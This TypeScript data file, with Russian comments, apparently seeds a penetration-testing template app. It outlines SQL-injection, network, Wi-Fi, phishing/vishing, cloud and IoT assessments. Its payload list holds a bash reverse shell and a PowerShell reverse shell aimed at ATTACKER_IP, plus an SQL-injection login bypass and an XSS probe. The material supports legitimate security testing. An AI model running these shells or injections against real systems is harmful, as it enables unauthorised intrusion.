// ===== ОСНОВНЫЕ ИНТЕРФЕЙСЫ =====

export interface AttackStep {
    id: string;
    name: string;
    description: string;
    type: 'reconnaissance' | 'scanning' | 'enumeration' | 'exploitation' | 'post_exploitation' | 'covering_tracks';
    payload?: string;
    parameters: { [key: string]: any };
    estimatedTime: string;
    riskLevel: 'safe' | 'moderate' | 'aggressive' | 'destructive';
    tools?: string[];
    requirements?: string[];
    output?: string;
    nextSteps?: string[];
}

export interface AttackTemplate {
    id: string;
    name: string;
    description: string;
    category: 'web_application' | 'network_service' | 'database' | 'wireless' | 'social_engineering' | 'mobile' | 'cloud' | 'iot';
    difficulty: 'beginner' | 'intermediate' | 'advanced' | 'expert';
    severity: 'low' | 'medium' | 'high' | 'critical';
    tags: string[];
    steps: AttackStep[];
    targetTypes: string[];
    requirements: string[];
    estimatedDuration: string;
    successRate: number;
    isDefault: boolean;
    isPublic: boolean;
    createdBy: string;
    createdAt: string;
    lastUsed?: string;
    usageCount: number;
    rating: number;
    downloads: number;
    vulnerabilities?: string[];
    mitigations?: string[];
    references?: string[];
}

export interface AttackVector {
    id: string;
    name: string;
    category: 'injection' | 'authentication' | 'authorization' | 'cryptography' | 'configuration' | 'network' | 'physical';
    description: string;
    techniques: string[];
    tools: string[];
    difficulty: 'low' | 'medium' | 'high';
    detectability: 'low' | 'medium' | 'high';
}

export interface AttackPayload {
    id: string;
    name: string;
    type: 'shell' | 'injection' | 'exploit' | 'script' | 'binary';
    platform: 'windows' | 'linux' | 'macos' | 'web' | 'mobile' | 'any';
    payload: string;
    description: string;
    encodings?: string[];
    obfuscation?: boolean;
}

// ===== ТЕСТОВЫЕ ДАННЫЕ =====

export const attackTemplatesData: AttackTemplate[] = [
    {
        id: 'template-001',
        name: 'SQL Injection Assessment',
        description: 'Комплексная проверка веб-приложения на уязвимости SQL-инъекций с использованием различных техник',
        category: 'web_application',
        difficulty: 'intermediate',
        severity: 'high',
        tags: ['sql', 'injection', 'web', 'database', 'owasp'],
        targetTypes: ['Web Application', 'API'],
        requirements: ['Доступ к веб-приложению', 'Burp Suite или аналог', 'SQLMap'],
        estimatedDuration: '2-4 часа',
        successRate: 85,
        isDefault: true,
        isPublic: true,
        createdBy: 'SecurityTeam',
        createdAt: '2025-01-15T10:00:00Z',
        lastUsed: '2025-08-15T14:30:00Z',
        usageCount: 247,
        rating: 4.7,
        downloads: 1250,
        vulnerabilities: ['SQL Injection', 'Information Disclosure', 'Authentication Bypass'],
        mitigations: ['Параметризованные запросы', 'Валидация входных данных', 'Минимальные привилегии БД'],
        references: [
            'https://owasp.org/www-project-top-ten/2017/A1_2017-Injection',
            'https://portswigger.net/web-security/sql-injection'
        ],
        steps: [
            {
                id: 'step-001',
                name: 'Target Reconnaissance',
                description: 'Сбор информации о целевом веб-приложении и его архитектуре',
                type: 'reconnaissance',
                parameters: {
                    passive: true,
                    tools: ['nmap', 'dirb', 'nikto'],
                    scope: 'application_fingerprinting'
                },
                estimatedTime: '30 мин',
                riskLevel: 'safe',
                tools: ['Nmap', 'Dirb', 'Nikto', 'Wappalyzer'],
                requirements: ['Сетевой доступ к приложению'],
                output: 'Список технологий, веб-сервер, фреймворки'
            },
            {
                id: 'step-002',
                name: 'Parameter Discovery',
                description: 'Поиск и каталогизация всех параметров для тестирования',
                type: 'scanning',
                parameters: {
                    automated: true,
                    manual: true,
                    methods: ['crawling', 'spidering', 'forced_browsing']
                },
                estimatedTime: '45 мин',
                riskLevel: 'safe',
                tools: ['Burp Suite Spider', 'OWASP ZAP', 'Gobuster'],
                requirements: ['Веб-прокси'],
                output: 'Карта приложения с параметрами'
            },
            {
                id: 'step-003',
                name: 'SQL Injection Testing',
                description: 'Тестирование найденных параметров на различные типы SQL-инъекций',
                type: 'exploitation',
                payload: "' OR 1=1-- -",
                parameters: {
                    payloads: ['union', 'boolean', 'time-based', 'error-based'],
                    automation: 'sqlmap',
                    manual_verification: true
                },
                estimatedTime: '2-3 часа',
                riskLevel: 'moderate',
                tools: ['SQLMap', 'Burp Suite Intruder', 'Manual Testing'],
                requirements: ['Список параметров для тестирования'],
                output: 'Подтвержденные SQL-инъекции с доказательствами'
            },
            {
                id: 'step-004',
                name: 'Data Extraction',
                description: 'Извлечение данных из базы для демонстрации воздействия',
                type: 'post_exploitation',
                parameters: {
                    extraction_type: 'limited_demo',
                    data_types: ['schema', 'users', 'sample_data'],
                    ethical_limits: true
                },
                estimatedTime: '1 час',
                riskLevel: 'moderate',
                tools: ['SQLMap', 'Custom Scripts'],
                requirements: ['Подтвержденная SQL-инъекция'],
                output: 'Ограниченный набор данных для демонстрации'
            }
        ]
    },
    {
        id: 'template-002',
        name: 'Network Penetration Testing',
        description: 'Полноценный пентест сетевой инфраструктуры с повышением привилегий',
        category: 'network_service',
        difficulty: 'advanced',
        severity: 'critical',
        tags: ['network', 'pentest', 'privilege-escalation', 'lateral-movement'],
        targetTypes: ['Network Range', 'Server Infrastructure'],
        requirements: ['Nmap', 'Metasploit', 'Сетевой доступ', 'Kali Linux'],
        estimatedDuration: '1-3 дня',
        successRate: 78,
        isDefault: true,
        isPublic: true,
        createdBy: 'PentestTeam',
        createdAt: '2025-02-10T09:00:00Z',
        lastUsed: '2025-08-14T11:20:00Z',
        usageCount: 156,
        rating: 4.9,
        downloads: 890,
        vulnerabilities: ['Remote Code Execution', 'Privilege Escalation', 'Lateral Movement'],
        mitigations: ['Патчи безопасности', 'Сегментация сети', 'Мониторинг', 'Принцип минимальных привилегий'],
        steps: [
            {
                id: 'step-004',
                name: 'Network Discovery',
                description: 'Обнаружение активных хостов в целевой сети',
                type: 'reconnaissance',
                parameters: {
                    ping_sweep: true,
                    arp_scan: true,
                    stealth: true
                },
                estimatedTime: '1 час',
                riskLevel: 'safe',
                tools: ['Nmap', 'Masscan', 'Angry IP Scanner'],
                output: 'Список активных IP-адресов'
            },
            {
                id: 'step-005',
                name: 'Port Scanning',
                description: 'Сканирование портов на обнаруженных хостах',
                type: 'scanning',
                parameters: {
                    tcp_scan: true,
                    udp_scan: false,
                    stealth: true,
                    top_ports: 1000
                },
                estimatedTime: '2-4 часа',
                riskLevel: 'safe',
                tools: ['Nmap', 'Masscan'],
                output: 'Карта открытых портов и сервисов'
            },
            {
                id: 'step-006',
                name: 'Service Exploitation',
                description: 'Эксплуатация уязвимых сервисов для получения доступа',
                type: 'exploitation',
                parameters: {
                    metasploit: true,
                    manual_exploits: true,
                    target_services: ['SMB', 'RDP', 'SSH', 'HTTP']
                },
                estimatedTime: '4-8 часов',
                riskLevel: 'aggressive',
                tools: ['Metasploit', 'Custom Exploits', 'Public PoCs'],
                output: 'Первоначальный доступ к системам'
            },
            {
                id: 'step-007',
                name: 'Privilege Escalation',
                description: 'Повышение привилегий на скомпрометированных системах',
                type: 'post_exploitation',
                parameters: {
                    local_exploits: true,
                    misconfigurations: true,
                    automated_tools: ['LinPEAS', 'WinPEAS']
                },
                estimatedTime: '2-4 часа',
                riskLevel: 'aggressive',
                tools: ['LinPEAS', 'WinPEAS', 'PowerUp', 'Local Exploits'],
                output: 'Административные привилегии'
            }
        ]
    },
    {
        id: 'template-003',
        name: 'Wireless Security Assessment',
        description: 'Аудит безопасности беспроводных сетей WPA/WPA2/WPA3',
        category: 'wireless',
        difficulty: 'intermediate',
        severity: 'medium',
        tags: ['wifi', 'wireless', 'wpa', 'handshake', 'evil-twin'],
        targetTypes: ['Wireless Network', 'Access Points'],
        requirements: ['Wireless adapter', 'Aircrack-ng', 'Hashcat', 'Kali Linux'],
        estimatedDuration: '3-6 часов',
        successRate: 65,
        isDefault: false,
        isPublic: true,
        createdBy: 'WirelessExpert',
        createdAt: '2025-03-05T14:00:00Z',
        lastUsed: '2025-08-12T16:45:00Z',
        usageCount: 89,
        rating: 4.3,
        downloads: 445,
        vulnerabilities: ['Weak WPA/WPA2 Passwords', 'WPS Vulnerabilities', 'Evil Twin Attacks'],
        mitigations: ['Сильные пароли WPA3', 'Отключение WPS', 'Мониторинг рogue AP'],
        steps: [
            {
                id: 'step-007',
                name: 'Wireless Reconnaissance',
                description: 'Поиск и анализ беспроводных сетей в радиусе действия',
                type: 'reconnaissance',
                parameters: {
                    passive_monitoring: true,
                    channel_hopping: true,
                    duration: '30_minutes'
                },
                estimatedTime: '30 мин',
                riskLevel: 'safe',
                tools: ['Airodump-ng', 'Kismet', 'WiFi Analyzer'],
                output: 'Список обнаруженных сетей и точек доступа'
            },
            {
                id: 'step-008',
                name: 'Handshake Capture',
                description: 'Захват WPA handshake для дальнейшего анализа паролей',
                type: 'scanning',
                parameters: {
                    deauth_attack: true,
                    patience_mode: true,
                    target_selection: 'active_clients'
                },
                estimatedTime: '1-2 часа',
                riskLevel: 'moderate',
                tools: ['Aireplay-ng', 'Airodump-ng'],
                output: 'Файлы с захваченными handshake'
            },
            {
                id: 'step-009',
                name: 'Password Cracking',
                description: 'Взлом паролей из захваченных handshake',
                type: 'exploitation',
                parameters: {
                    dictionary_attack: true,
                    wordlists: ['rockyou.txt', 'custom_wireless.txt'],
                    hybrid_attack: true
                },
                estimatedTime: '2-24 часа',
                riskLevel: 'safe',
                tools: ['Hashcat', 'Aircrack-ng', 'John the Ripper'],
                output: 'Восстановленные пароли сетей'
            }
        ]
    },
    {
        id: 'template-004',
        name: 'Social Engineering Campaign',
        description: 'Комплексная кампания социальной инженерии с фишингом и pretexting',
        category: 'social_engineering',
        difficulty: 'expert',
        severity: 'high',
        tags: ['phishing', 'social-engineering', 'pretexting', 'vishing', 'osint'],
        targetTypes: ['Organization', 'Employees'],
        requirements: ['Email infrastructure', 'Phone system', 'Social media research', 'Gophish'],
        estimatedDuration: '1-2 недели',
        successRate: 92,
        isDefault: false,
        isPublic: false,
        createdBy: 'SocialEngTeam',
        createdAt: '2025-04-20T08:00:00Z',
        lastUsed: '2025-08-10T12:30:00Z',
        usageCount: 23,
        rating: 4.8,
        downloads: 67,
        vulnerabilities: ['Human Factor', 'Information Disclosure', 'Credential Theft'],
        mitigations: ['Обучение персонала', 'Политики безопасности', 'Технические средства защиты'],
        steps: [
            {
                id: 'step-009',
                name: 'OSINT Collection',
                description: 'Сбор открытой информации о целевой организации и сотрудниках',
                type: 'reconnaissance',
                parameters: {
                    osint: true,
                    social_media: true,
                    linkedin: true,
                    company_research: true
                },
                estimatedTime: '2-3 дня',
                riskLevel: 'safe',
                tools: ['theHarvester', 'Maltego', 'Social Media', 'LinkedIn'],
                output: 'База данных сотрудников и организационной структуры'
            },
            {
                id: 'step-010',
                name: 'Phishing Campaign',
                description: 'Создание и отправка целевых фишинговых писем',
                type: 'exploitation',
                parameters: {
                    email_templates: true,
                    landing_pages: true,
                    personalization: true,
                    tracking: true
                },
                estimatedTime: '3-5 дней',
                riskLevel: 'moderate',
                tools: ['Gophish', 'SET', 'Custom Templates'],
                output: 'Статистика переходов и введенных данных'
            },
            {
                id: 'step-011',
                name: 'Vishing Campaign',
                description: 'Телефонные звонки с использованием pretexting',
                type: 'exploitation',
                parameters: {
                    pretext_scenarios: ['IT Support', 'HR Department', 'Vendor'],
                    information_gathering: true,
                    credential_harvesting: false
                },
                estimatedTime: '2-3 дня',
                riskLevel: 'moderate',
                tools: ['SpoofCard', 'Voice Changers', 'Scripts'],
                output: 'Собранная информация и уровень доверия'
            }
        ]
    },
    {
        id: 'template-005',
        name: 'Cloud Infrastructure Assessment',
        description: 'Аудит безопасности облачной инфраструктуры AWS/Azure/GCP',
        category: 'cloud',
        difficulty: 'advanced',
        severity: 'high',
        tags: ['cloud', 'aws', 'azure', 'gcp', 'misconfig', 's3', 'iam'],
        targetTypes: ['Cloud Environment', 'Container Infrastructure'],
        requirements: ['Cloud credentials', 'CLI tools', 'ScoutSuite', 'Prowler'],
        estimatedDuration: '2-4 дня',
        successRate: 88,
        isDefault: false,
        isPublic: true,
        createdBy: 'CloudSecTeam',
        createdAt: '2025-05-15T11:00:00Z',
        lastUsed: '2025-08-08T09:15:00Z',
        usageCount: 134,
        rating: 4.6,
        downloads: 723,
        vulnerabilities: ['Misconfigured Storage', 'Weak IAM Policies', 'Exposed Services'],
        mitigations: ['Принцип минимальных привилегий', 'Шифрование', 'Мониторинг', 'Автоматизированные проверки'],
        steps: [
            {
                id: 'step-011',
                name: 'Cloud Environment Enumeration',
                description: 'Перечисление ресурсов и сервисов в облачной среде',
                type: 'enumeration',
                parameters: {
                    automated_tools: true,
                    api_enumeration: true,
                    service_discovery: true
                },
                estimatedTime: '4-6 часов',
                riskLevel: 'safe',
                tools: ['AWS CLI', 'Azure CLI', 'ScoutSuite', 'CloudMapper'],
                output: 'Инвентаризация облачных ресурсов'
            },
            {
                id: 'step-012',
                name: 'Misconfiguration Detection',
                description: 'Поиск неправильных конфигураций безопасности',
                type: 'scanning',
                parameters: {
                    security_groups: true,
                    iam_policies: true,
                    storage: true,
                    network_config: true
                },
                estimatedTime: '6-8 часов',
                riskLevel: 'safe',
                tools: ['Prowler', 'ScoutSuite', 'CloudSploit', 'Custom Scripts'],
                output: 'Отчет о найденных misconfigurations'
            },
            {
                id: 'step-013',
                name: 'Privilege Escalation',
                description: 'Попытки повышения привилегий в облачной среде',
                type: 'exploitation',
                parameters: {
                    iam_exploitation: true,
                    service_account_abuse: true,
                    cross_service_access: true
                },
                estimatedTime: '4-8 часов',
                riskLevel: 'moderate',
                tools: ['Pacu', 'Custom Scripts', 'Cloud APIs'],
                output: 'Демонстрация возможности эскалации привилегий'
            }
        ]
    },
    {
        id: 'template-006',
        name: 'IoT Device Penetration Test',
        description: 'Тестирование безопасности IoT устройств и протоколов',
        category: 'iot',
        difficulty: 'expert',
        severity: 'medium',
        tags: ['iot', 'mqtt', 'coap', 'zigbee', 'firmware', 'hardware'],
        targetTypes: ['IoT Devices', 'Smart Home', 'Industrial IoT'],
        requirements: ['Hardware tools', 'Protocol analyzers', 'Firmware tools', 'Logic analyzer'],
        estimatedDuration: '3-5 дней',
        successRate: 71,
        isDefault: false,
        isPublic: true,
        createdBy: 'IoTSecTeam',
        createdAt: '2025-06-01T13:00:00Z',
        lastUsed: '2025-08-05T15:20:00Z',
        usageCount: 45,
        rating: 4.4,
        downloads: 289,
        vulnerabilities: ['Firmware Vulnerabilities', 'Protocol Weaknesses', 'Hardware Exploitation'],
        mitigations: ['Регулярные обновления', 'Сетевая сегментация', 'Шифрование коммуникаций'],
        steps: [
            {
                id: 'step-013',
                name: 'Device Discovery',
                description: 'Обнаружение IoT устройств в сети и их идентификация',
                type: 'reconnaissance',
                parameters: {
                    network_scan: true,
                    protocol_analysis: true,
                    device_fingerprinting: true
                },
                estimatedTime: '2-3 часа',
                riskLevel: 'safe',
                tools: ['Nmap', 'Shodan', 'IoT Inspector', 'Protocol Analyzers'],
                output: 'Список IoT устройств с характеристиками'
            },
            {
                id: 'step-014',
                name: 'Firmware Analysis',
                description: 'Статический и динамический анализ прошивки устройств',
                type: 'enumeration',
                parameters: {
                    static_analysis: true,
                    dynamic_analysis: true,
                    vulnerability_scanning: true
                },
                estimatedTime: '1-2 дня',
                riskLevel: 'safe',
                tools: ['Binwalk', 'QEMU', 'Ghidra', 'Firmwalker'],
                output: 'Анализ безопасности прошивки'
            },
            {
                id: 'step-015',
                name: 'Protocol Exploitation',
                description: 'Эксплуатация уязвимостей в IoT протоколах',
                type: 'exploitation',
                parameters: {
                    mqtt_testing: true,
                    coap_testing: true,
                    custom_protocols: true
                },
                estimatedTime: '1-2 дня',
                riskLevel: 'moderate',
                tools: ['MQTT clients', 'CoAP tools', 'Custom Scripts'],
                output: 'Демонстрация компрометации через протоколы'
            }
        ]
    }
];

// ===== ВЕКТОРЫ АТАК =====

export const attackVectors: AttackVector[] = [
    {
        id: 'vector-001',
        name: 'SQL Injection',
        category: 'injection',
        description: 'Внедрение SQL кода через пользовательский ввод',
        techniques: ['Union-based', 'Boolean-based', 'Time-based', 'Error-based'],
        tools: ['SQLMap', 'Burp Suite', 'Manual Testing'],
        difficulty: 'medium',
        detectability: 'medium'
    },
    {
        id: 'vector-002',
        name: 'Cross-Site Scripting (XSS)',
        category: 'injection',
        description: 'Внедрение клиентского кода в веб-приложения',
        techniques: ['Reflected XSS', 'Stored XSS', 'DOM XSS'],
        tools: ['XSSHunter', 'BeEF', 'Manual Testing'],
        difficulty: 'low',
        detectability: 'medium'
    },
    {
        id: 'vector-003',
        name: 'Remote Code Execution',
        category: 'network',
        description: 'Выполнение произвольного кода на удаленной системе',
        techniques: ['Buffer Overflow', 'Deserialization', 'Command Injection'],
        tools: ['Metasploit', 'Custom Exploits', 'Public PoCs'],
        difficulty: 'high',
        detectability: 'high'
    },
    {
        id: 'vector-004',
        name: 'Password Attacks',
        category: 'authentication',
        description: 'Атаки на системы аутентификации',
        techniques: ['Brute Force', 'Dictionary Attack', 'Credential Stuffing'],
        tools: ['Hydra', 'Hashcat', 'John the Ripper'],
        difficulty: 'low',
        detectability: 'medium'
    }
];

// ===== ПОЛЕЗНЫЕ НАГРУЗКИ =====

export const attackPayloads: AttackPayload[] = [
    {
        id: 'payload-001',
        name: 'Basic SQL Injection',
        type: 'injection',
        platform: 'web',
        payload: "' OR 1=1-- -",
        description: 'Базовая SQL инъекция для обхода аутентификации',
        encodings: ['URL', 'Base64'],
        obfuscation: false
    },
    {
        id: 'payload-002',
        name: 'Reverse Shell (Linux)',
        type: 'shell',
        platform: 'linux',
        payload: 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',
        description: 'Обратная оболочка для Linux систем через bash',
        encodings: ['Base64', 'Hex'],
        obfuscation: true
    },
    {
        id: 'payload-003',
        name: 'PowerShell Reverse Shell',
        type: 'shell',
        platform: 'windows',
        payload: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'ATTACKER_IP\',PORT);"',
        description: 'Обратная оболочка для Windows через PowerShell',
        encodings: ['Base64', 'Unicode'],
        obfuscation: true
    },
    {
        id: 'payload-004',
        name: 'XSS Alert Payload',
        type: 'script',
        platform: 'web',
        payload: '<script>alert("XSS")</script>',
        description: 'Простой XSS payload для тестирования',
        encodings: ['HTML', 'JavaScript'],
        obfuscation: false
    }
];

// ===== КАТЕГОРИИ ШАБЛОНОВ =====

export const templateCategories = [
    { id: 'web_application', name: 'Веб-приложения', icon: 'Globe', count: 0 },
    { id: 'network_service', name: 'Сетевые сервисы', icon: 'Network', count: 0 },
    { id: 'database', name: 'Базы данных', icon: 'Database', count: 0 },
    { id: 'wireless', name: 'Беспроводные сети', icon: 'Wifi', count: 0 },
    { id: 'social_engineering', name: 'Социальная инженерия', icon: 'Users', count: 0 },
    { id: 'mobile', name: 'Мобильные устройства', icon: 'Smartphone', count: 0 },
    { id: 'cloud', name: 'Облачные сервисы', icon: 'Cloud', count: 0 },
    { id: 'iot', name: 'IoT устройства', icon: 'Radio', count: 0 }
];

// ===== УРОВНИ СЛОЖНОСТИ =====

export const difficultyLevels = [
    { id: 'beginner', name: 'Начальный', color: 'bg-green-100 text-green-800', description: 'Подходит для новичков' },
    { id: 'intermediate', name: 'Средний', color: 'bg-yellow-100 text-yellow-800', description: 'Требует базовых знаний' },
    { id: 'advanced', name: 'Продвинутый', color: 'bg-orange-100 text-orange-800', description: 'Для опытных специалистов' },
    { id: 'expert', name: 'Экспертный', color: 'bg-red-100 text-red-800', description: 'Только для экспертов' }
];

// ===== УРОВНИ СЕРЬЕЗНОСТИ =====

export const severityLevels = [
    { id: 'low', name: 'Низкий', color: 'bg-blue-100 text-blue-800' },
    { id: 'medium', name: 'Средний', color: 'bg-yellow-100 text-yellow-800' },
    { id: 'high', name: 'Высокий', color: 'bg-orange-100 text-orange-800' },
    { id: 'critical', name: 'Критический', color: 'bg-red-100 text-red-800' }
];

// ===== СТАТИСТИКА =====

export const templateStatistics = {
    total: attackTemplatesData.length,
    byCategory: {
        web_application: attackTemplatesData.filter(t => t.category === 'web_application').length,
        network_service: attackTemplatesData.filter(t => t.category === 'network_service').length,
        database: attackTemplatesData.filter(t => t.category === 'database').length,
        wireless: attackTemplatesData.filter(t => t.category === 'wireless').length,
        social_engineering: attackTemplatesData.filter(t => t.category === 'social_engineering').length,
        mobile: attackTemplatesData.filter(t => t.category === 'mobile').length,
        cloud: attackTemplatesData.filter(t => t.category === 'cloud').length,
        iot: attackTemplatesData.filter(t => t.category === 'iot').length
    },
    byDifficulty: {
        beginner: attackTemplatesData.filter(t => t.difficulty === 'beginner').length,
        intermediate: attackTemplatesData.filter(t => t.difficulty === 'intermediate').length,
        advanced: attackTemplatesData.filter(t => t.difficulty === 'advanced').length,
        expert: attackTemplatesData.filter(t => t.difficulty === 'expert').length
    },
    bySeverity: {
        low: attackTemplatesData.filter(t => t.severity === 'low').length,
        medium: attackTemplatesData.filter(t => t.severity === 'medium').length,
        high: attackTemplatesData.filter(t => t.severity === 'high').length,
        critical: attackTemplatesData.filter(t => t.severity === 'critical').length
    },
    totalDownloads: attackTemplatesData.reduce((sum, t) => sum + t.downloads, 0),
    averageRating: attackTemplatesData.reduce((sum, t) => sum + t.rating, 0) / attackTemplatesData.length,
    totalUsage: attackTemplatesData.reduce((sum, t) => sum + t.usageCount, 0)
};

// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====

export const getTemplatesByCategory = (category: string): AttackTemplate[] => {
    return attackTemplatesData.filter(template => template.category === category);
};

export const getTemplatesByDifficulty = (difficulty: string): AttackTemplate[] => {
    return attackTemplatesData.filter(template => template.difficulty === difficulty);
};

export const getTemplatesBySeverity = (severity: string): AttackTemplate[] => {
    return attackTemplatesData.filter(template => template.severity === severity);
};

export const getPopularTemplates = (limit: number = 5): AttackTemplate[] => {
    return attackTemplatesData
        .sort((a, b) => b.downloads - a.downloads)
        .slice(0, limit);
};

export const getTopRatedTemplates = (limit: number = 5): AttackTemplate[] => {
    return attackTemplatesData
        .sort((a, b) => b.rating - a.rating)
        .slice(0, limit);
};

export const getRecentTemplates = (limit: number = 5): AttackTemplate[] => {
    return attackTemplatesData
        .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
        .slice(0, limit);
};

export const searchTemplates = (query: string): AttackTemplate[] => {
    const lowercaseQuery = query.toLowerCase();
    return attackTemplatesData.filter(template =>
        template.name.toLowerCase().includes(lowercaseQuery) ||
        template.description.toLowerCase().includes(lowercaseQuery) ||
        template.tags.some(tag => tag.toLowerCase().includes(lowercaseQuery))
    );
};

export const validateTemplate = (template: Partial<AttackTemplate>): { valid: boolean; errors: string[] } => {
    const errors: string[] = [];

    if (!template.name?.trim()) {
        errors.push('Название шаблона обязательно');
    }

    if (!template.description?.trim()) {
        errors.push('Описание шаблона обязательно');
    }

    if (!template.category) {
        errors.push('Категория шаблона обязательна');
    }

    if (!template.steps || template.steps.length === 0) {
        errors.push('Шаблон должен содержать хотя бы один шаг');
    }

    return {
        valid: errors.length === 0,
        errors
    };
};

// ===== ЭКСПОРТ ПО УМОЛЧАНИЮ =====

export default {
    attackTemplatesData,
    attackVectors,
    attackPayloads,
    templateCategories,
    difficultyLevels,
    severityLevels,
    templateStatistics
};
